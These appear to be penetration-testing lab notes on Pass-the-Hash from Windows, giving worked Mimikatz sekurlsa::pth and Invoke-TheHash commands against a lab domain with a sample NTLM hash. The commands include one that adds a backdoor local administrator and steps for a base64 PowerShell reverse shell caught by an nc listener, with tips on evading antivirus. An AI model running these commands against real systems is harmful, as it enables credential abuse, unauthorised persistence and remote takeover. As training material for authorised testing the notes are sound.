# Pass the Hash (PtH) from Windows
**Concept:** You are on a compromised Windows machine (Machine A). You have harvested an NTLM hash for a user who is an Admin on Machine B. You want to execute commands on Machine B using that hash, without ever knowing the cleartext password.
**Key Insight:** Windows does not natively allow you to "login with a hash." Tools like Mimikatz work by spawning a new process (like `cmd.exe`) and injecting the hash into that process's memory. Any network connection made from that specific command prompt uses the injected credentials.
## 1. Mimikatz (`sekurlsa::pth`)
**Mechanism:** "Over-the-Pass-the-Hash." Mimikatz creates a new process and patches the LSASS memory for that specific process to use the provided NTLM hash for network authentication.

**Parameters:**
- `/user`: The username to impersonate.
- `/rc4` or `/NTLM`: The NTLM hash (32 chars).
- `/domain`: Target domain (use `.` or the computer name for local accounts).
- `/run`: The binary to launch (default is `cmd.exe`).

```powershell
# Syntax:
# mimikatz.exe "sekurlsa::pth /user:<User> /rc4:<Hash> /domain:<Domain> /run:<Binary>"

# Example: Spawning a CMD as 'Julio' using his hash
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

**Result:** A new Command Prompt window opens.
- **Locally:** `whoami` will still show the original user (e.g., `Administrator`).
- **Network:** Accessing `\\DC01\C$` will authenticate as `Julio`.
## 2. Invoke-TheHash (PowerShell)
**Context:** If you cannot drop `.exe` files (like Mimikatz) due to AV, use this PowerShell suite. It implements the SMB and WMI protocols purely in PowerShell script, allowing PtH without touching disk. 
**Source:** [Invoke-TheHash (GitHub)](https://github.com/Kevin-Robertson/Invoke-TheHash)

**Key Parameters:**
- `-Target`: IP or Hostname of the victim.
- `-Hash`: The NTLM hash.
- `-Command`: The command to execute on the target.
### Method A: Invoke-SMBExec
**Mechanism:** Creates a service on the target to execute the command (similar to Impacket's `psexec`).
```powershell
Import-Module .\Invoke-TheHash.psd1

# Create a user 'mark' and add to Local Admins
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add"
```
### Method B: Invoke-WMIExec
**Mechanism:** Uses WMI (Windows Management Instrumentation) to execute commands. Generally stealthier than SMBExec. 
**Use Case:** Spawning a reverse shell.

1. **Generate Payload:** Create a Base64 encoded PowerShell reverse shell (e.g., via RevShells.com).    
2. **Start Listener:** `nc -lvnp 8001` on your attacker box.
3. **Execute:**
```powershell
Import-Module .\Invoke-TheHash.psd1

# Execute Base64 Payload via WMI
# Note: The command length is limited in WMI, so Base64 is preferred.
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0AL..."
```